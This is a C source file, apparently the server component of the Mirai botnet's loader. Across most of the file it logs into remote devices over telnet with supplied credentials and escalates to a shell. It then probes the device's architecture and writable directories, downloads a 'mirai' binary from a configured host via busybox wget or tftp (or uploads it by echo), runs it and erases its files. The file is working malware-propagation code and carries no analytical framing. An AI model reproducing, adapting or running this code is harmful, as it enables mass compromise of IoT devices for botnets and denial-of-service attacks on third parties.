#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <pthread.h>
#include <sys/epoll.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <string.h>
#include <sched.h>
#include <errno.h>
#include "headers/includes.h"
#include "headers/server.h"
#include "headers/telnet_info.h"
#include "headers/connection.h"
#include "headers/binary.h"
#include "headers/util.h"

struct server *server_create(uint8_t threads, uint8_t addr_len, ipv4_t *addrs, uint32_t max_open, char *wghip, port_t wghp, char *thip)
{
    struct server *srv = calloc(1, sizeof (struct server));
    struct server_worker *workers = calloc(threads, sizeof (struct server_worker));
    int i;

    // Fill out the structure
    srv->bind_addrs_len = addr_len;
    srv->bind_addrs = addrs;
    srv->max_open = max_open;
    srv->wget_host_ip = wghip;
    srv->wget_host_port = wghp;
    srv->tftp_host_ip = thip;
    srv->estab_conns = calloc(max_open * 2, sizeof (struct connection *));
    srv->workers = calloc(threads, sizeof (struct server_worker));
    srv->workers_len = threads;

    if (srv->estab_conns == NULL)
    {
        printf("Failed to allocate establisted_connections array\n");
        exit(0);
    }

    // Allocate locks internally
    for (i = 0; i < max_open * 2; i++)
    {
        srv->estab_conns[i] = calloc(1, sizeof (struct connection));
        if (srv->estab_conns[i] == NULL)
        {
            printf("Failed to allocate connection %d\n", i);
            exit(-1);
        }
        pthread_mutex_init(&(srv->estab_conns[i]->lock), NULL);
    }

    // Create worker threads
    for (i = 0; i < threads; i++)
    {
        struct server_worker *wrker = &srv->workers[i];

        wrker->srv = srv;
        wrker->thread_id = i;

        if ((wrker->efd = epoll_create1(0)) == -1)
        {
            printf("Failed to initialize epoll context. Error code %d\n", errno);
            free(srv->workers);
            free(srv);
            return NULL;
        }

        pthread_create(&wrker->thread, NULL, worker, wrker);
    }

    pthread_create(&srv->to_thrd, NULL, timeout_thread, srv);

    return srv;
}

void server_destroy(struct server *srv)
{
    if (srv == NULL)
        return;
    if (srv->bind_addrs != NULL)
        free(srv->bind_addrs);
    if (srv->workers != NULL)
        free(srv->workers);
    free(srv);
}

void server_queue_telnet(struct server *srv, struct telnet_info *info)
{
    while (ATOMIC_GET(&srv->curr_open) >= srv->max_open)
    {
        sleep(1);
    }
    ATOMIC_INC(&srv->curr_open);

    if (srv == NULL)
        printf("srv == NULL 3\n");

    server_telnet_probe(srv, info);
}

void server_telnet_probe(struct server *srv, struct telnet_info *info)
{
    int fd = util_socket_and_bind(srv);
    struct sockaddr_in addr;
    struct connection *conn;
    struct epoll_event event;
    int ret;
    struct server_worker *wrker = &srv->workers[ATOMIC_INC(&srv->curr_worker_child) % srv->workers_len];

    if (fd == -1)
    {
        if (time(NULL) % 10 == 0)
        {
            printf("Failed to open and bind socket\n");
        }
        ATOMIC_DEC(&srv->curr_open);
        return;
    }
    while (fd >= (srv->max_open * 2))
    {
        printf("fd too big\n");
        conn->fd = fd;
#ifdef DEBUG
        printf("Can't utilize socket because client buf is not large enough\n");
#endif
        connection_close(conn);
        return;
    }

    if (srv == NULL)
        printf("srv == NULL 4\n");

    conn = srv->estab_conns[fd];
    memcpy(&conn->info, info, sizeof (struct telnet_info));
    conn->srv = srv;
    conn->fd = fd;
    connection_open(conn);

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = info->addr;
    addr.sin_port = info->port;
    ret = connect(fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in));
    if (ret == -1 && errno != EINPROGRESS)
    {
        printf("got connect error\n");
    }

    event.data.fd = fd;
    event.events = EPOLLOUT;
    epoll_ctl(wrker->efd, EPOLL_CTL_ADD, fd, &event);
}

static void bind_core(int core)
{
    pthread_t tid = pthread_self();
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(core, &cpuset);
    if (pthread_setaffinity_np(tid, sizeof (cpu_set_t), &cpuset) != 0)
        printf("Failed to bind to core %d\n", core);
}

static void *worker(void *arg)
{
    struct server_worker *wrker = (struct server_worker *)arg;
    struct epoll_event events[128];

    bind_core(wrker->thread_id);

    while (TRUE)
    {
        int i, n = epoll_wait(wrker->efd, events, 127, -1);

        if (n == -1)
            perror("epoll_wait");

        for (i = 0; i < n; i++)
            handle_event(wrker, &events[i]);
    }
}

static void handle_event(struct server_worker *wrker, struct epoll_event *ev)
{
    struct connection *conn = wrker->srv->estab_conns[ev->data.fd];

    if (conn->fd == -1)
    {
        conn->fd = ev->data.fd;
        connection_close(conn);
        return;
    }

    if (conn->fd != ev->data.fd)
    {
        printf("yo socket mismatch\n");
    }

    // Check if there was an error
    if (ev->events & EPOLLERR || ev->events & EPOLLHUP || ev->events & EPOLLRDHUP)
    {
#ifdef DEBUG
        if (conn->open)
            printf("[FD%d] Encountered an error and must shut down\n", ev->data.fd);
#endif
        connection_close(conn);
        return;
    }

    // Are we ready to write?
    if (conn->state_telnet == TELNET_CONNECTING && ev->events & EPOLLOUT)
    {
        struct epoll_event event;

        int so_error = 0;
        socklen_t len = sizeof(so_error);
        getsockopt(conn->fd, SOL_SOCKET, SO_ERROR, &so_error, &len);
        if (so_error)
        {
#ifdef DEBUG
            printf("[FD%d] Connection refused\n", ev->data.fd);
#endif
            connection_close(conn);
            return;
        }

#ifdef DEBUG
        printf("[FD%d] Established connection\n", ev->data.fd);
#endif
        event.data.fd = conn->fd;
        event.events = EPOLLIN | EPOLLET;
        epoll_ctl(wrker->efd, EPOLL_CTL_MOD, conn->fd, &event);
        conn->state_telnet = TELNET_READ_IACS;
        conn->timeout = 30;
    }

    if (!conn->open)
    {
        printf("socket not open! conn->fd: %d, fd: %d, events: %08x, state: %08x\n", conn->fd, ev->data.fd, ev->events, conn->state_telnet);
    }

    // Is there data to read?
    if (ev->events & EPOLLIN && conn->open)
    {
        int ret;

        conn->last_recv = time(NULL);
        while (TRUE)
        {
            ret = recv(conn->fd, conn->rdbuf + conn->rdbuf_pos, sizeof (conn->rdbuf) - conn->rdbuf_pos, MSG_NOSIGNAL);
            if (ret <= 0)
            {
                if (errno != EAGAIN && errno != EWOULDBLOCK)
                {
#ifdef DEBUG
                    if (conn->open)
                        printf("[FD%d] Encountered error %d. Closing\n", ev->data.fd, errno);
#endif
                    connection_close(conn);
                }
                break;
            }
#ifdef DEBUG
            printf("TELIN: %.*s\n", ret, conn->rdbuf + conn->rdbuf_pos);
#endif
            conn->rdbuf_pos += ret;
            conn->last_recv = time(NULL);

            if (conn->rdbuf_pos > 8196)
			{
                printf("oversized buffer pointer!\n");
				abort();
			}

            while (TRUE)
            {
                int consumed;

                switch (conn->state_telnet)
                {
                    case TELNET_READ_IACS:
                        consumed = connection_consume_iacs(conn);
                        if (consumed)
                            conn->state_telnet = TELNET_USER_PROMPT;
                        break;
                    case TELNET_USER_PROMPT:
                        consumed = connection_consume_login_prompt(conn);
                        if (consumed)
                        {
                            util_sockprintf(conn->fd, "%s", conn->info.user);
                            strcpy(conn->output_buffer.data, "\r\n");
                            conn->output_buffer.deadline = time(NULL) + 1;
                            conn->state_telnet = TELNET_PASS_PROMPT;
                        }
                        break;
                    case TELNET_PASS_PROMPT:
                        consumed = connection_consume_password_prompt(conn);
                        if (consumed)
                        {
                            util_sockprintf(conn->fd, "%s", conn->info.pass);
                            strcpy(conn->output_buffer.data, "\r\n");
                            conn->output_buffer.deadline = time(NULL) + 1;
                            conn->state_telnet = TELNET_WAITPASS_PROMPT; // At the very least it will print SOMETHING
                        }
                        break;
                    case TELNET_WAITPASS_PROMPT:
                        if ((consumed = connection_consume_prompt(conn)) > 0)
                        {
                            util_sockprintf(conn->fd, "enable\r\n");
                            util_sockprintf(conn->fd, "shell\r\n");
                            util_sockprintf(conn->fd, "sh\r\n");
                            conn->state_telnet = TELNET_CHECK_LOGIN;
                        }
                        break;
                    case TELNET_CHECK_LOGIN:
                        if ((consumed = connection_consume_prompt(conn)) > 0)
                        {
                            util_sockprintf(conn->fd, TOKEN_QUERY "\r\n");
                            conn->state_telnet = TELNET_VERIFY_LOGIN;
                        }
                        break;
                    case TELNET_VERIFY_LOGIN:
                        consumed = connection_consume_verify_login(conn);
                        if (consumed)
                        {
                            ATOMIC_INC(&wrker->srv->total_logins);
#ifdef DEBUG
                            printf("[FD%d] Succesfully logged in\n", ev->data.fd);
#endif
                            util_sockprintf(conn->fd, "/bin/busybox ps; " TOKEN_QUERY "\r\n");
                            conn->state_telnet = TELNET_PARSE_PS;
                        }
                        break;
                    case TELNET_PARSE_PS:
                        if ((consumed = connection_consume_psoutput(conn)) > 0)
                        {
                            util_sockprintf(conn->fd, "/bin/busybox cat /proc/mounts; " TOKEN_QUERY "\r\n");
                            conn->state_telnet = TELNET_PARSE_MOUNTS;
                        }
                        break;
                    case TELNET_PARSE_MOUNTS:
                        consumed = connection_consume_mounts(conn);
                        if (consumed)
                            conn->state_telnet = TELNET_READ_WRITEABLE;
                        break;
                    case TELNET_READ_WRITEABLE:
                        consumed = connection_consume_written_dirs(conn);
                        if (consumed)
                        {
#ifdef DEBUG
                            printf("[FD%d] Found writeable directory: %s/\n", ev->data.fd, conn->info.writedir);
#endif
                            util_sockprintf(conn->fd, "cd %s/\r\n", conn->info.writedir, conn->info.writedir);
                            util_sockprintf(conn->fd, "/bin/busybox cp /bin/echo " FN_BINARY "; >" FN_BINARY "; /bin/busybox chmod 777 " FN_BINARY "; " TOKEN_QUERY "\r\n");
                            conn->state_telnet = TELNET_COPY_ECHO;
                            conn->timeout = 120;
                        }
                        break;
                    case TELNET_COPY_ECHO:
                        consumed = connection_consume_copy_op(conn);
                        if (consumed)
                        {
#ifdef DEBUG
                            printf("[FD%d] Finished copying /bin/echo to cwd\n", conn->fd);
#endif
                            if (!conn->info.has_arch)
                            {
                                conn->state_telnet = TELNET_DETECT_ARCH;
                                conn->timeout = 120;
                                // DO NOT COMBINE THESE
                                util_sockprintf(conn->fd, "/bin/busybox cat /bin/echo\r\n");
                                util_sockprintf(conn->fd, TOKEN_QUERY "\r\n");
                            }
                            else
                            {
                                conn->state_telnet = TELNET_UPLOAD_METHODS;
                                conn->timeout = 15;
                                util_sockprintf(conn->fd, "/bin/busybox wget; /bin/busybox tftp; " TOKEN_QUERY "\r\n");
                            }
                        }
                        break;
                    case TELNET_DETECT_ARCH:
                        consumed = connection_consume_arch(conn);
                        if (consumed)
                        {
                            conn->timeout = 15;
                            if ((conn->bin = binary_get_by_arch(conn->info.arch)) == NULL)
                            {
#ifdef DEBUG
                                printf("[FD%d] Cannot determine architecture\n", conn->fd);
#endif
                                connection_close(conn);
                            }
                            else if (strcmp(conn->info.arch, "arm") == 0)
                            {
#ifdef DEBUG
                                printf("[FD%d] Determining ARM sub-type\n", conn->fd);
#endif
                                util_sockprintf(conn->fd, "cat /proc/cpuinfo; " TOKEN_QUERY "\r\n");
                                conn->state_telnet = TELNET_ARM_SUBTYPE;
                            }
                            else
                            {
#ifdef DEBUG
                                printf("[FD%d] Detected architecture: '%s'\n", ev->data.fd, conn->info.arch);
#endif
                                util_sockprintf(conn->fd, "/bin/busybox wget; /bin/busybox tftp; " TOKEN_QUERY "\r\n");
                                conn->state_telnet = TELNET_UPLOAD_METHODS;
                            }
                        }
                        break;
                    case TELNET_ARM_SUBTYPE:
                        if ((consumed = connection_consume_arm_subtype(conn)) > 0)
                        {
                            struct binary *bin = binary_get_by_arch(conn->info.arch);

                            if (bin == NULL)
                            {
#ifdef DEBUG
                                printf("[FD%d] We do not have an ARMv7 binary, so we will try using default ARM\n", conn->fd);
#endif
                            }
                            else
                                conn->bin = bin;

                            util_sockprintf(conn->fd, "/bin/busybox wget; /bin/busybox tftp; " TOKEN_QUERY "\r\n");
                            conn->state_telnet = TELNET_UPLOAD_METHODS;
                        }
                        break;
                    case TELNET_UPLOAD_METHODS:
                        consumed = connection_consume_upload_methods(conn);

                        if (consumed)
                        {
#ifdef DEBUG
                            printf("[FD%d] Upload method is ", conn->fd);
#endif
                            switch (conn->info.upload_method)
                            {
                                case UPLOAD_ECHO:
                                    conn->state_telnet = TELNET_UPLOAD_ECHO;
                                    conn->timeout = 30;
                                    util_sockprintf(conn->fd, "/bin/busybox cp "FN_BINARY " " FN_DROPPER "; > " FN_DROPPER "; /bin/busybox chmod 777 " FN_DROPPER "; " TOKEN_QUERY "\r\n");
#ifdef DEBUG
                                    printf("echo\n");
#endif
                                    break;
                                case UPLOAD_WGET:
                                    conn->state_telnet = TELNET_UPLOAD_WGET;
                                    conn->timeout = 120;
                                    util_sockprintf(conn->fd, "/bin/busybox wget http://%s:%d/bins/%s.%s -O - > "FN_BINARY "; /bin/busybox chmod 777 " FN_BINARY "; " TOKEN_QUERY "\r\n",
                                                    wrker->srv->wget_host_ip, wrker->srv->wget_host_port, "mirai", conn->info.arch);
#ifdef DEBUG
                                    printf("wget\n");
#endif
                                    break;
                                case UPLOAD_TFTP:
                                    conn->state_telnet = TELNET_UPLOAD_TFTP;
                                    conn->timeout = 120;
                                    util_sockprintf(conn->fd, "/bin/busybox tftp -g -l %s -r %s.%s %s; /bin/busybox chmod 777 " FN_BINARY "; " TOKEN_QUERY "\r\n",
                                                    FN_BINARY, "mirai", conn->info.arch, wrker->srv->tftp_host_ip);
#ifdef DEBUG
                                    printf("tftp\n");
#endif
                                    break;
                            }
                        }
                        break;
                    case TELNET_UPLOAD_ECHO:   
                        consumed = connection_upload_echo(conn);
                        if (consumed)
                        {
                            conn->state_telnet = TELNET_RUN_BINARY;
                            conn->timeout = 30;
#ifdef DEBUG
                            printf("[FD%d] Finished echo loading!\n", conn->fd);
#endif
                            util_sockprintf(conn->fd, "./%s; ./%s %s.%s; " EXEC_QUERY "\r\n", FN_DROPPER, FN_BINARY, id_tag, conn->info.arch);
                            ATOMIC_INC(&wrker->srv->total_echoes);
                        }
                        break;
                    case TELNET_UPLOAD_WGET:
                        consumed = connection_upload_wget(conn);
                        if (consumed)
                        {
                            conn->state_telnet = TELNET_RUN_BINARY;
                            conn->timeout = 30;
#ifdef DEBUG
                            printf("[FD%d] Finished wget loading\n", conn->fd);
#endif
                            util_sockprintf(conn->fd, "./" FN_BINARY " %s.%s; " EXEC_QUERY "\r\n", id_tag, conn->info.arch);
                            ATOMIC_INC(&wrker->srv->total_wgets);
                        }
                        break;
                    case TELNET_UPLOAD_TFTP:
                        consumed = connection_upload_tftp(conn);
                        if (consumed > 0)
                        {
                            conn->state_telnet = TELNET_RUN_BINARY;
                            conn->timeout = 30;
#ifdef DEBUG
                            printf("[FD%d] Finished tftp loading\n", conn->fd);
#endif
                            util_sockprintf(conn->fd, "./" FN_BINARY " %s.%s; " EXEC_QUERY "\r\n", id_tag, conn->info.arch);
                            ATOMIC_INC(&wrker->srv->total_tftps);
                        }
                        else if (consumed < -1) // Did not have permission to TFTP
                        {
#ifdef DEBUG
                            printf("[FD%d] No permission to TFTP load, falling back to echo!\n", conn->fd);
#endif
                            consumed *= -1;
                            conn->state_telnet = TELNET_UPLOAD_ECHO;
                            conn->info.upload_method = UPLOAD_ECHO;

                            conn->timeout = 30;
                            util_sockprintf(conn->fd, "/bin/busybox cp "FN_BINARY " " FN_DROPPER "; > " FN_DROPPER "; /bin/busybox chmod 777 " FN_DROPPER "; " TOKEN_QUERY "\r\n");
                        }
                        break;
                    case TELNET_RUN_BINARY:
                        if ((consumed = connection_verify_payload(conn)) > 0)
                        {
                            if (consumed >= 255)
                            {
                                conn->success = TRUE;
#ifdef DEBUG
                                printf("[FD%d] Succesfully ran payload\n", conn->fd);
#endif
                                consumed -= 255;
                            }
                            else
                            {
#ifdef DEBUG
                                printf("[FD%d] Failed to execute payload\n", conn->fd);
#endif
                                if (!conn->retry_bin && strncmp(conn->info.arch, "arm", 3) == 0)
                                {
                                    conn->echo_load_pos = 0;
                                    strcpy(conn->info.arch, (conn->info.arch[3] == '\0' ? "arm7" : "arm"));
                                    conn->bin = binary_get_by_arch(conn->info.arch);
                                    util_sockprintf(conn->fd, "/bin/busybox wget; /bin/busybox tftp; " TOKEN_QUERY "\r\n");
                                    conn->state_telnet = TELNET_UPLOAD_METHODS;
                                    conn->retry_bin = TRUE;
                                    break;
                                }
                            }
#ifndef DEBUG
                            util_sockprintf(conn->fd, "rm -rf " FN_DROPPER "; > " FN_BINARY "; " TOKEN_QUERY "\r\n");
#else
                            util_sockprintf(conn->fd, TOKEN_QUERY "\r\n");
#endif
                            conn->state_telnet = TELNET_CLEANUP;
                            conn->timeout = 10;
                        }
                        break;
                    case TELNET_CLEANUP:
                        if ((consumed = connection_consume_cleanup(conn)) > 0)
                        {
                            int tfd = conn->fd;

                            connection_close(conn);
#ifdef DEBUG
                            printf("[FD%d] Cleaned up files\n", tfd);
#endif
                        }
                    default:
                        consumed = 0;
                        break;
                }

                if (consumed == 0) // We didn't consume any data
                    break;
                else
                {
                    if (consumed > conn->rdbuf_pos)
                    {
                        consumed = conn->rdbuf_pos;
                        //printf("consuming more then our position!\n");
                        //abort();
                    }
                    conn->rdbuf_pos -= consumed;
                    memmove(conn->rdbuf, conn->rdbuf + consumed, conn->rdbuf_pos);
                    conn->rdbuf[conn->rdbuf_pos] = 0;
                }

                if (conn->rdbuf_pos > 8196)
                {
                    printf("oversized buffer! 2\n");
                    abort();
                }
            }
        }
    }
}

static void *timeout_thread(void *arg)
{
    struct server *srv = (struct server *)arg;
    int i, ct;

    while (TRUE)
    {
        ct = time(NULL);

        for (i = 0; i < (srv->max_open * 2); i++)
        {
            struct connection *conn = srv->estab_conns[i];

            if (conn->open && conn->last_recv > 0 && ct - conn->last_recv > conn->timeout)
            {
#ifdef DEBUG
                printf("[FD%d] Timed out\n", conn->fd);
#endif
                if (conn->state_telnet == TELNET_RUN_BINARY && !conn->ctrlc_retry && strncmp(conn->info.arch, "arm", 3) == 0)
                {
                    conn->last_recv = time(NULL);
                    util_sockprintf(conn->fd, "\x03\x1Akill %%1\r\nrm -rf " FN_BINARY " " FN_DROPPER "\r\n");
                    conn->ctrlc_retry = TRUE;

                    conn->echo_load_pos = 0;
                    strcpy(conn->info.arch, (conn->info.arch[3] == '\0' ? "arm7" : "arm"));
                    conn->bin = binary_get_by_arch(conn->info.arch);
                    util_sockprintf(conn->fd, "/bin/busybox wget; /bin/busybox tftp; " TOKEN_QUERY "\r\n");
                    conn->state_telnet = TELNET_UPLOAD_METHODS;
                    conn->retry_bin = TRUE;
                } else {
                    connection_close(conn);
                }
            } else if (conn->open && conn->output_buffer.deadline != 0 && time(NULL) > conn->output_buffer.deadline)
            {
                conn->output_buffer.deadline = 0;
                util_sockprintf(conn->fd, conn->output_buffer.data);
            }
        }

        sleep(1);
    }
}

